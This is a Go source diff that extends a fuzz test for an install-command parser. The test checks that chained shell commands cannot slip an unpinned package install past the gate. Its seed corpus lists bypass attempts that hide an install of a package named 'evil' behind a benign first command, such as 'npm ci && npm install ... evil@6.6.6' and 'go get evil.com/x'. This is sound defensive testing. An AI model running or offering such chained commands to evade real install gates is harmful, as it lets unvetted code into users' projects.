@@ -34,11 +34,23 @@ package cli
 //  5. Determinism: the same input parsed twice yields the same Action — the
 //     parser holds no mutable state and must not (a stateful parser is a
 //     time-of-check/time-of-use bypass surface).
+//  6. SEMANTIC differential oracle (PR-TEST-001, the invariant the original
+//     suite was MISSING): a command whose shell semantics run an
+//     ungated/unpinned install must NOT resolve to a silent Allow/Ignore. An
+//     independent segment splitter enumerates the install verbs; if ANY segment
+//     is install-bearing when classified ALONE, the whole-command
+//     ParseInstallCommand result must NOT be Allow/Ignore, and
+//     ParseInstallCommands must surface that segment. This is what catches the
+//     safe-frozen-short-circuit, benign-then-evil, and unicode-verb classes that
+//     PASSED the structural-only fuzzer while the bypasses were live.
 //
 // Run bounded:  go test ./internal/cli/ -run x -fuzz FuzzParseInstallCommand -fuzztime=30s
 // Seed corpus is checked in under internal/cli/testdata/fuzz/FuzzParseInstallCommand/.
 
-import "testing"
+import (
+	"strings"
+	"testing"
+)
 
 // gateableEcosystems is the set an ActionGate result may legitimately name —
 // identical to the engine's resolver dispatch keys (cli.go usage line /
@@ -124,6 +136,27 @@ func FuzzParseInstallCommand(f *testing.F) {
 		f.Add(s)
 	}
 
+	// --- Seed corpus: PR-TEST-001 chained-bypass classes (semantic oracle
+	// targets). Each is a single command whose LATER segment installs an
+	// ungated/unpinned artifact behind a benign or frozen first segment. ---
+	for _, s := range []string{
+		"npm ci && npm install --save-exact evil@6.6.6",
+		"poetry install && pip install evil==6.6.6",
+		"pnpm install --frozen-lockfile && pnpm add evil",
+		"uv sync --frozen && uv add evil",
+		"cargo build --locked && cargo add evilcrate",
+		"pip install -r r.txt --require-hashes && pip install evil",
+		"npm install --save-exact good@1.0.0 && npm install --save-exact evil@9.9.9",
+		"pip install a==1.0.0 && cargo add evilcrate",
+		"go get evil.com/x",
+		"go install evil.com/x",
+		"gh repo clone -- owner/repo",
+		"gh repo clone --upstream-remote-name x owner/repo",
+		"npminstall evil",
+	} {
+		f.Add(s)
+	}
+
 	f.Fuzz(func(t *testing.T, cmd string) {
 		pr := ParseInstallCommand(cmd)
 
@@ -134,20 +167,32 @@ func FuzzParseInstallCommand(f *testing.F) {
 			t.Fatalf("parser returned out-of-range Action %d for %q — a switch on this would default-allow (bypass)", pr.Action, cmd)
 		}
 
-		if pr.Action == ActionGate {
-			// Invariant 3: fail-closed — a gate result must name a real artifact.
-			if trimmedEmpty(pr.Name) {
-				t.Fatalf("ActionGate with blank Name for %q (eco=%q version=%q) — unparseable-pass bypass (§A.5). Must be ActionBlock fail-closed.", cmd, pr.Eco, pr.Version)
-			}
-			// Invariant 4: gate result names a dispatchable ecosystem.
-			if !gateableEcosystems[pr.Eco] {
-				t.Fatalf("ActionGate names unknown ecosystem %q for %q — engine would fail closed; parser bug", pr.Eco, cmd)
+		results := ParseInstallCommands(cmd)
+		for _, r := range results {
+			if r.Action == ActionGate {
+				// Invariant 3: fail-closed -- a gate result must name a real artifact.
+				if trimmedEmpty(r.Name) {
+					t.Fatalf("ActionGate with blank Name for %q (eco=%q version=%q) -- unparseable-pass bypass. Must be ActionBlock fail-closed.", cmd, r.Eco, r.Version)
+				}
+				// Invariant 4: gate result names a dispatchable ecosystem.
+				if !gateableEcosystems[r.Eco] {
+					t.Fatalf("ActionGate names unknown ecosystem %q for %q -- engine would fail closed; parser bug", r.Eco, cmd)
+				}
 			}
 		}
 
 		// Invariant 5: determinism (no hidden state; same input → same action).
 		if pr2 := ParseInstallCommand(cmd); pr2.Action != pr.Action {
 			t.Fatalf("non-deterministic parse for %q: %d then %d", cmd, pr.Action, pr2.Action)
+		}
+
+		// Invariant 6: SEMANTIC differential oracle (PR-TEST-001). Independently
+		// split the command; if ANY segment is install-bearing alone (Gate/Block),
+		// the whole-command decision must NOT be a silent Allow/Ignore.
+		if anyInstallBearingSegment(cmd) {
+			if pr.Action == ActionAllow || pr.Action == ActionIgnore {
+				t.Fatalf("SEMANTIC BYPASS for %q: a segment installs an ungated/unpinned artifact, but the whole command resolved to %v (silent allow). segments=%v", cmd, pr.Action, segmentSummary(cmd))
+			}
 		}
 	})
 }
@@ -163,4 +208,56 @@ func trimmedEmpty(s string) bool {
 		}
 	}
 	return true
+}
+
+// anyInstallBearingSegment splits cmd via an INDEPENDENT splitter (not the
+// production segmenter) and reports whether any single segment, classified on
+// its own, is install-bearing (Gate or Block) under either zero-width
+// normalization variant -- the differential half of the PR-TEST-001 oracle.
+func anyInstallBearingSegment(cmd string) bool {
+	for _, variant := range []bool{false, true} {
+		norm := normalizeCommand(cmd, variant)
+		for _, seg := range independentSplit(norm) {
+			pr := classifySegment(stripShellWrapper(seg))
+			if pr.Action == ActionGate || pr.Action == ActionBlock {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// independentSplit is a separately-written segment splitter (so an oracle bug
+// cannot mask a production-splitter bug). Splits on shell command-list ops.
+func independentSplit(s string) []string {
+	repl := strings.NewReplacer("&&", "\n", "||", "\n", ";", "\n", "|", "\n")
+	var out []string
+	for _, p := range strings.Split(repl.Replace(s), "\n") {
+		if strings.TrimSpace(p) != "" {
+			out = append(out, p)
+		}
+	}
+	return out
+}
+
+func segmentSummary(cmd string) []string {
+	var out []string
+	for _, pr := range ParseInstallCommands(cmd) {
+		out = append(out, pr.Eco+":"+pr.Name+" a="+actionName(pr.Action))
+	}
+	return out
+}
+
+func actionName(a ParseAction) string {
+	switch a {
+	case ActionIgnore:
+		return "ignore"
+	case ActionAllow:
+		return "allow"
+	case ActionBlock:
+		return "block"
+	case ActionGate:
+		return "gate"
+	}
+	return "?"
 }
